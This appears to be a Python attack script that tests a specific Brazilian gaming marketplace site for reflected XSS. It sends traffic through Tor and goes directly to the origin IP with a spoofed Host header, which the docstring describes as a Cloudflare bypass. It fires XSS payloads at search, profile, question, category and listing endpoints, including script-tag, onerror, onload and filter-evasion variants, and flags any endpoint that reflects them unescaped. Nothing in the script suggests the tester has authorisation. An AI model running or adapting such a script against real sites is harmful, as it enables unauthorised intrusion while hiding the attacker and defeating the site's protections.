#!/usr/bin/env python3
"""XSS reflected/stored testing — desapegogames.com.br via bypass CF (.54)."""
import requests, urllib3, urllib.parse, re
urllib3.disable_warnings()
PROXY={"https":"socks5://127.0.0.1:9050","http":"socks5://127.0.0.1:9050"}
BASE="https://186.226.60.54"
HOSTH="desapegogames.com.br"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"

PAYLOADS = [
    "xssprobe9x9",
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'><script>alert(1)</script>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
]

def test_reflect(name, method, url, param, payloads, extra_data=None):
    print(f"\n=== {name} ({method} {url} param={param}) ===")
    for p in payloads:
        sess=requests.Session(); sess.proxies.update(PROXY)
        if method=="POST":
            data={param:p}
            if extra_data: data.update(extra_data)
            try:
                r=sess.post(url,headers={"Host":HOSTH,"User-Agent":UA},data=data,verify=False,timeout=30,allow_redirects=False)
            except Exception as e:
                print(f"  {p[:40]!r} EXC {e}"); continue
        else:
            full=url+urllib.parse.quote(p)
            try:
                r=sess.get(full,headers={"Host":HOSTH,"User-Agent":UA},verify=False,timeout=30,allow_redirects=False)
            except Exception as e:
                print(f"  {p[:40]!r} EXC {e}"); continue
        body=r.content
        raw = p.encode() in body
        # escaped forms (html entities)
        esc_lt = p.replace("<", chr(60)+"lt;").encode() in body
        esc_quot = (p.replace(chr(34), chr(38)+"quot;")).encode() in body
        marker = "RAW!" if raw else ("esc" if (esc_lt or esc_quot) else "absent")
        # se RAW e payload tem <script> ou onerror, é XSS confirmado
        xss = raw and ("<script>" in p.lower() or "onerror=" in p.lower() or "onload=" in p.lower() or "javascript:" in p.lower())
        print(f"  {p[:45]!r:50s} -> HTTP {r.status_code} len={len(body)} {marker} {'*** XSS ***' if xss else ''}")
        if xss:
            i=body.find(p.encode())
            if i>=0:
                print(f"     contexto: ...{body[max(0,i-60):i+len(p)+30]!r}...")

# 1) /busca.html POST pesquisar
test_reflect("/busca.html (POST pesquisar)","POST",f"{BASE}/busca.html","pesquisar",PAYLOADS)

# 2) /perfil/<user> GET (reflected in profile?)
test_reflect("/perfil/<x> (GET)","GET",f"{BASE}/perfil/","user",PAYLOADS)

# 3) /anuncio/perguntas.html POST anuncio (reflected no erro?)
test_reflect("/anuncio/perguntas.html (POST anuncio)","POST",f"{BASE}/anuncio/perguntas.html","anuncio",PAYLOADS)

# 4) /categoria/<x> GET
test_reflect("/categoria/<x> (GET)","GET",f"{BASE}/categoria/","cat",["xssprobe9x9","<script>alert(1)</script>"])

# 5) /anuncio/<id>/<slug> GET (slug reflected?)
test_reflect("/anuncio/1/<x> (GET slug)","GET",f"{BASE}/anuncio/1/","slug",["xssprobe9x9","<script>alert(1)</script>"])

print("\n[*] XSS testing concluido.")
